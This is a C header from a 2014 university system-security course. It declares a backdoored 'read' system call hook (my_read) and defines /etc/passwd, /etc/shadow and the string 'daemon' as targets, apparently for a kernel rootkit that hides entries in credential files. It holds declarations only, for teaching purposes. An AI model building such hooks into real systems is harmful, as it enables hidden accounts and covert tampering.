/**********************************************************
	Last Updated: Nov 16, 2014
	CSE509 System Security 2014 Fall @CS SBU
	Written By: 
		Hyungjoon Koo (hykoo@cs.stonybrook.edu)
		Yaohui Chen (yaohchen@cs.stonybrook.edu)

	Description: 
		Headers for backdoor 'read' system call
***********************************************************/

asmlinkage long
my_read(unsigned int fd, char *buf, size_t count);

// Define target files and a tampered string
const char *passwd = "/etc/passwd";
const char *shadow = "/etc/shadow";
// const char *tmp_tampered = "/tmp/hide_kcr";
const char *hide_str = "daemon";	// ptr2
const char *delimiter = "\n";		// ptr3